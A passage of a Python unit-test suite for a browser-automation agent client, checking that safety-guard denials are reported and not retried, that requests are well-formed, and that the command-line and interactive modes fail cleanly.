# --------------------------------------------------------------------------
# 5. Safety-guard denials
# --------------------------------------------------------------------------

class SafetyDecisionTests(AgentTestCase):
    """The guard answers with {'success': False, 'safety_decision': ...}:
    confirmation_required, read_only, blocked_url, human_denied. A client
    that reads a refusal as "nothing there", or retries it, is worse than one
    that stops."""

    # Regression test for defect D8.
    def test_extract_text_distinguishes_a_denial_from_an_empty_page(self):
        """A denial and "no matching text" both return None, so a caller
        concludes the text is not on the page when the guard refused to
        look."""
        self.serve_json({'success': False,
                         'safety_decision': 'read_only',
                         'error': 'browser_execute_script is refused in '
                                  'read-only mode.'})
        agent = browser_agent.BrowserAutomationAgent()
        how, value = self.outcome(agent.extract_text, 'h1')
        if how == 'raised':
            return  # raising is an acceptable way to signal the refusal
        self.assertIsNotNone(
            value,
            'extract_text() returned None for a read_only denial, which is '
            'exactly what it returns for a page with no matching text')

    # Regression test for defect D8.
    def test_extract_links_distinguishes_a_denial_from_a_page_with_no_links(self):
        self.serve_json({'success': False,
                         'safety_decision': 'blocked_url',
                         'error': 'URL matches blocked_url_patterns.'})
        agent = browser_agent.BrowserAutomationAgent()
        how, value = self.outcome(agent.extract_links)
        if how == 'raised':
            return
        self.assertNotEqual(
            value, [],
            'extract_links() returned [] for a blocked_url denial, which a '
            'caller reads as "this page has no links"')

    # Regression test for defect D9.
    def test_fill_form_does_not_retry_a_safety_denial(self):
        """The retry is for a wrong locator. confirmation_required means stop
        and ask the human; retrying with a different locator spends the rate
        limit and works around the point of the confirmation."""
        self.serve_denial(2)
        agent = browser_agent.BrowserAutomationAgent()
        agent.fill_form({'email': 'alice@example.com'})
        self.assertEqual(
            len(self.requests), 1,
            'fill_form retried an action the safety guard refused')

    # Regression test for defect D10.
    def test_fill_form_reports_a_submit_that_never_happened(self):
        """With no submit_selector, fill_form tries four selectors and appends
        nothing when they all fail. The caller gets a results list that looks
        like a clean fill and cannot tell the form was never submitted."""
        self.serve_ok(1)       # the field
        self.serve_denial(4)   # every candidate submit button
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.fill_form({'#email': 'alice@example.com'}, submit=True)
        self.assertEqual(
            len(results), 2,
            'fill_form(submit=True) returned %d result(s): the failed submit '
            'is invisible to the caller' % len(results))
        self.assertFalse(results[-1].get('success'))

    # Regression test for defect D11.
    def test_search_reports_a_denial_of_the_query_typing(self):
        """search() discards the result of typing the query and returns the
        result of pressing Enter. A denied query plus a successful Enter reads
        as a successful search."""
        self.serve_denial(1)   # typing the query was refused
        self.serve_ok(1)       # pressing Enter succeeded
        agent = browser_agent.BrowserAutomationAgent()
        how, result = self.outcome(agent.search, 'quarterly results')
        if how == 'raised':
            return
        self.assertFalse(
            result.get('success'),
            'search() reported success although the query was never typed')

    def test_get_page_info_does_not_cache_a_denied_result(self):
        # CURRENT BEHAVIOUR (regression guard): this one is right.
        self.serve_json({'success': False, 'safety_decision': 'read_only',
                         'error': 'refused'})
        agent = browser_agent.BrowserAutomationAgent()
        agent.get_page_info()
        self.assertIsNone(agent.current_page_info)

    def test_a_denial_is_recorded_in_the_history_as_a_failure(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_denial(1)
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(selector='#pay')
        action = agent.action_history[-1]
        self.assertFalse(action.success)
        self.assertIsNotNone(action.error)


# --------------------------------------------------------------------------
# 6. Request shape
# --------------------------------------------------------------------------

class RequestShapeTests(AgentTestCase):

    def test_call_tool_posts_the_tool_name_and_arguments(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.call_tool('browser_navigate', url='https://example.com')
        req = self.only_request()
        self.assertEqual(req.method, 'POST')
        self.assertTrue(req.url.endswith('/mcp/call'))
        self.assertEqual(req.body,
                         {'name': 'browser_navigate',
                          'arguments': {'url': 'https://example.com'}})
        self.assertEqual(req.timeout, 30)

    def test_screenshot_asks_the_server_to_save_the_file(self):
        # CURRENT BEHAVIOUR (regression guard): the image must not come back
        # through this client as base64 for a caller to print.
        self.serve_ok(path='/tmp/x.png')
        agent = browser_agent.BrowserAutomationAgent()
        agent.screenshot()
        self.assertIs(self.only_request().arguments['save_to_file'], True)

    def test_omitted_locators_are_not_sent(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(selector='#ok')
        self.assertEqual(set(self.only_request().arguments),
                         {'selector', 'double_click', 'right_click'})

    def test_click_coordinates_of_zero_are_sent(self):
        # CURRENT BEHAVIOUR (regression guard): 0 is a valid coordinate.
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.click(x=0, y=0)
        args = self.only_request().arguments
        self.assertEqual((args.get('x'), args.get('y')), (0, 0))

    # Regression test for defect D16.
    def test_reload_localhost_refuses_port_zero(self):
        """reload_localhost(port=0) tested the port with 'if port:', so 0
        silently became "reload every localhost tab" instead of the one port
        asked for. --reload-localhost 0 reaches this.

        An earlier version of this test accepted either refusing 0 or sending
        it, which meant it pinned nothing: both branches passed, so it could
        not have caught a change of mind in either direction. The behaviour is
        decided - 0 is not a port anything listens on, so it is refused with a
        message - and that is what is asserted."""
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()

        result = agent.reload_localhost(port=0)

        self.assertEqual(self.requests, [],
                         'port 0 must not reach the server at all')
        self.assertFalse(result.get('success'))
        self.assertIn('port', result['error'].lower())

    def test_reload_localhost_refuses_a_port_outside_the_range(self):
        for port in (-1, 65536, 99999):
            with self.subTest(port=port):
                self.requests.clear()
                self.serve_ok()
                result = browser_agent.BrowserAutomationAgent().reload_localhost(
                    port=port)
                self.assertFalse(result.get('success'), port)
                self.assertEqual(self.requests, [])

    def test_reload_localhost_sends_a_real_port_as_one_url(self):
        """The companion assertion: a usable port must still narrow the
        request to that port rather than falling back to a pattern."""
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().reload_localhost(port=5173)
        args = self.only_request().arguments
        self.assertNotIn('url_pattern', args)
        self.assertIn('5173', str(args.get('url', '')))


# --------------------------------------------------------------------------
# 7. CLI surface
# --------------------------------------------------------------------------

class CliTests(AgentTestCase):

    def run_main(self, *argv):
        buf = io.StringIO()
        code = None
        with mock.patch.object(sys, 'argv', ['browser_agent.py', *argv]):
            with redirect_stdout(buf):
                try:
                    browser_agent.main()
                except SystemExit as exc:
                    code = exc.code
        return code, buf.getvalue()

    def test_check_reports_a_healthy_server_and_exits_zero(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'ok'})
        code, out = self.run_main('--check')
        self.assertEqual(code, 0)
        self.assertIn('running', out)

    def test_check_exits_nonzero_when_the_server_is_unavailable(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve(browser_agent.urllib.error.URLError('refused'))
        code, out = self.run_main('--check')
        self.assertEqual(code, 1)
        self.assertIn('not available', out)

    def test_no_arguments_prints_help_and_makes_no_request(self):
        # CURRENT BEHAVIOUR (regression guard).
        _, out = self.run_main()
        self.assertIn('--interactive', out)
        self.assertEqual(self.requests, [])

    def test_verbose_navigate_logs_the_tool_call(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        _, out = self.run_main('--verbose', '--navigate', 'https://example.com')
        self.assertIn('[BrowserAgent]', out)
        self.assertIn('browser_navigate', out)

    # Regression test for defect D13.
    def test_command_dispatch_rejects_a_dunder_attribute(self):
        """--command does getattr(agent, name) on whatever it is handed and
        calls it. '__init__' re-runs the constructor and wipes the action
        history, and the printed "null" tells the user nothing happened
        wrong."""
        _, out = self.run_main('--command', '__init__')
        self.assertIn(
            'Unknown command', out,
            '--command dispatched to a dunder attribute instead of refusing '
            'it; only the documented commands should be reachable')
        self.assertEqual(self.requests, [])

    # Regression test for defect D13.
    def test_command_dispatch_rejects_an_internal_method(self):
        _, out = self.run_main('--command', 'log oops')
        self.assertIn('Unknown command', out)

    # Regression test for defect D13.
    def test_command_with_the_wrong_number_of_arguments_fails_cleanly(self):
        """'--command login alice' calls login(username, password) one
        argument short, and the TypeError escapes main() as a traceback."""
        try:
            _, out = self.run_main('--command', 'login alice')
        except TypeError as exc:
            self.fail('--command crashed with an unhandled TypeError: %s' % exc)
        self.assertIn('Unknown command', out)

    def test_every_listed_command_is_a_method_that_exists(self):
        """The allowlist named 'get_text', which no method implements, so
        '--command get_text' ended in an AttributeError traceback."""
        agent = browser_agent.BrowserAutomationAgent()
        missing = sorted(name for name in browser_agent.COMMAND_METHODS
                         if not callable(getattr(agent, name, None)))
        self.assertEqual(missing, [],
                         'COMMAND_METHODS names methods that do not exist')

    # Regression test for defect D13: only TypeError was caught, so any other
    # exception from a command reached the user as a traceback.
    def test_a_refused_command_is_reported_without_a_traceback(self):
        """extract_text raises BrowserAgentDenied when the guard refuses, by
        design - a denial must not read as an empty page. The CLI has to turn
        that into a sentence."""
        self.serve_json({'success': False, 'safety_decision': 'read_only',
                         'error': 'browser_execute_script is refused in '
                                  'read-only mode.'})
        _, out = self.run_main('--command', 'extract_text div')
        self.assertIn('refused', out.lower())
        self.assertNotIn('Traceback', out)

    # Regression test for defect D13.
    def test_a_command_argument_of_the_wrong_kind_fails_cleanly(self):
        """'reload_localhost <url>' hands a non-number to int(); the
        ValueError escaped main()."""
        _, out = self.run_main('--command', 'reload_localhost http://x')
        self.assertIn('ValueError', out,
                      'the failure must name what went wrong rather than '
                      'being swallowed: %r' % out)
        self.assertEqual(self.requests, [])

    def test_a_typed_credential_is_not_echoed_by_the_printed_result(self):
        """--command type_text prints the server's result, and the
        not-found error quotes the text it was asked to type."""
        self.serve_element_not_found(text=PASSWORD, clear=True)
        _, out = self.run_main('--command', 'type_text %s' % PASSWORD)
        self.assertNotIn(PASSWORD, out)


class InteractiveModeTests(AgentTestCase):

    def drive(self, lines, responses=(), verbose=False):
        self.serve(*responses)
        buf = io.StringIO()
        agent = browser_agent.BrowserAutomationAgent(verbose=verbose)
        with mock.patch.object(browser_agent, 'input',
                               mock.Mock(side_effect=list(lines)),
                               create=True):
            with redirect_stdout(buf):
                browser_agent.interactive_mode(agent)
        return buf.getvalue()

    def test_exit_leaves_the_loop_without_a_request(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(['exit'])
        self.assertIn('Goodbye', out)
        self.assertEqual(self.requests, [])

    def test_navigate_passes_the_url_through_and_prints_the_result(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(
            ['navigate https://example.com', 'exit'],
            [FakeResponse('{"success": true, "url": "https://example.com"}')])
        self.assertEqual(self.only_request().arguments['url'],
                         'https://example.com')
        self.assertIn('"success": true', out)

    def test_an_unknown_command_is_reported_and_does_not_exit(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive(['frobnicate', 'exit'])
        self.assertIn('Unknown command: frobnicate', out)
        self.assertIn('Goodbye', out)

    def test_a_keyboard_interrupt_does_not_end_the_session(self):
        # CURRENT BEHAVIOUR (regression guard).
        out = self.drive([KeyboardInterrupt(), 'exit'])
        self.assertIn('Interrupted', out)
        self.assertIn('Goodbye', out)

    # Regression test for defect D15.
    def test_the_loop_exits_when_stdin_reaches_end_of_file(self):
        """A piped or closed stdin raises EOFError from input(). The loop's
        bare 'except Exception' catches it, prints "Error: " and immediately
        asks for input again, so the process spins on a dead stdin instead of
        exiting."""
        calls = []

        def feed(prompt=''):
            calls.append(prompt)
            if len(calls) > 3:
                raise LoopGuard
            raise EOFError

        buf = io.StringIO()
        agent = browser_agent.BrowserAutomationAgent()
        try:
            with mock.patch.object(browser_agent, 'input', feed, create=True):
                with redirect_stdout(buf):
                    browser_agent.interactive_mode(agent)
        except LoopGuard:
            self.fail('interactive_mode kept prompting after EOF on stdin '
                      '(%d prompts); a closed stdin must end the session'
                      % len(calls))
        self.assertEqual(self.requests, [])


if __name__ == '__main__':
    unittest.main()
